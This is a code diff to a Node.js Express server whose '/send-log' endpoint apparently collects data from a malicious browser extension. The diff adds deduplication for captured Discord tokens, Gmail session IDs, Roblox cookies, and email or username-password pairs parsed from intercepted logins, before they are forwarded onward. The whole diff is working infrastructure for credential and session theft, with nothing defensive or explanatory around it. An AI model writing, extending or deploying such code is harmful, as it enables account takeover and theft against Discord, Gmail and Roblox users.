@@ -6,6 +6,12 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 const HOST = '0.0.0.0';
 
+// Global tracking to prevent duplicate sends
+const sentTokens = new Set(); // Track sent Discord tokens
+const sentSIDs = new Set(); // Track sent Gmail SIDs
+const sentRobloxCookies = new Set(); // Track sent Roblox cookies
+const sentCredentials = new Set(); // Track sent credentials (all services)
+
 // Middleware
 app.use(cors());
 app.use(express.json());
@@ -441,11 +447,152 @@ async function fetchRobloxUserData(token) {
   }
 }
 
+// Function to generate credential hash for deduplication
+function generateCredentialHash(credentials, service) {
+  if (!credentials) return null;
+  const username = credentials.username || credentials.email || '';
+  const password = credentials.password || '';
+  if (!username && !password) return null;
+  return `${service}:${username}:${password}`;
+}
+
+// Function to generate token/cookie hash for deduplication
+function generateTokenHash(token, service) {
+  if (!token || token.length < 10) return null;
+  // Use first and last 10 characters to create a unique identifier
+  return `${service}:${token.substring(0, 10)}...${token.substring(token.length - 10)}`;
+}
+
 // Endpoint to receive logs from browser extension
 app.post('/send-log', async (req, res) => {
   try {
     const logData = req.body;
-    console.log('Received log:', logData);
+    console.log('Received log:', logData.level);
+    
+    // Check for duplicates based on service type
+    let shouldSkip = false;
+    let skipReason = '';
+
+    // Handle Discord captures
+    if (logData.level === 'discord_captured' && logData.token) {
+      const tokenHash = generateTokenHash(logData.token, 'discord');
+      if (tokenHash && sentTokens.has(tokenHash)) {
+        shouldSkip = true;
+        skipReason = 'Discord token already sent';
+      } else if (tokenHash) {
+        sentTokens.add(tokenHash);
+      }
+
+      // Also check credentials if available
+      if (logData.credentials && !shouldSkip) {
+        const credHash = generateCredentialHash(logData.credentials, 'discord');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Discord credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Handle Discord login credentials
+    if (logData.level === 'discord_login') {
+      // Extract credentials from message
+      const messageMatch = logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
+      if (messageMatch) {
+        const credentials = { email: messageMatch[1], password: messageMatch[2] };
+        const credHash = generateCredentialHash(credentials, 'discord');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Discord login credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Handle Gmail captures
+    if (logData.level === 'gmail_captured' && logData.sid) {
+      const sidHash = generateTokenHash(logData.sid, 'gmail');
+      if (sidHash && sentSIDs.has(sidHash)) {
+        shouldSkip = true;
+        skipReason = 'Gmail SID already sent';
+      } else if (sidHash) {
+        sentSIDs.add(sidHash);
+      }
+
+      // Also check credentials if available
+      if (logData.credentials && !shouldSkip) {
+        const credHash = generateCredentialHash(logData.credentials, 'gmail');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Gmail credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Handle Gmail login credentials
+    if (logData.level === 'gmail_login') {
+      // Extract credentials from message
+      const messageMatch = logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
+      if (messageMatch) {
+        const credentials = { email: messageMatch[1], password: messageMatch[2] };
+        const credHash = generateCredentialHash(credentials, 'gmail');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Gmail login credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Handle Roblox combined (existing deduplication enhanced)
+    if (logData.level === 'roblox_combined' && logData.cookie) {
+      const cookieHash = generateTokenHash(logData.cookie, 'roblox');
+      if (cookieHash && sentRobloxCookies.has(cookieHash)) {
+        shouldSkip = true;
+        skipReason = 'Roblox cookie already sent';
+      } else if (cookieHash) {
+        sentRobloxCookies.add(cookieHash);
+      }
+
+      // Also check credentials
+      if (logData.credentials && !shouldSkip) {
+        const credHash = generateCredentialHash(logData.credentials, 'roblox');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Roblox credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Handle Roblox login credentials
+    if (logData.level === 'roblox_login') {
+      // Extract credentials from message
+      const messageMatch = logData.message.match(/Username:\s*(.+?),\s*Password:\s*(.+)/);
+      if (messageMatch) {
+        const credentials = { username: messageMatch[1], password: messageMatch[2] };
+        const credHash = generateCredentialHash(credentials, 'roblox');
+        if (credHash && sentCredentials.has(credHash)) {
+          shouldSkip = true;
+          skipReason = 'Roblox login credentials already sent';
+        } else if (credHash) {
+          sentCredentials.add(credHash);
+        }
+      }
+    }
+
+    // Skip sending if duplicate
+    if (shouldSkip) {
+      console.log(`Skipping duplicate: ${skipReason}`);
+      res.status(200).json({ success: true, skipped: true, reason: skipReason });
+      return;
+    }
     
     // Handle roblox_combined type - fetch data first, then format
     if (logData.level === 'roblox_combined') {
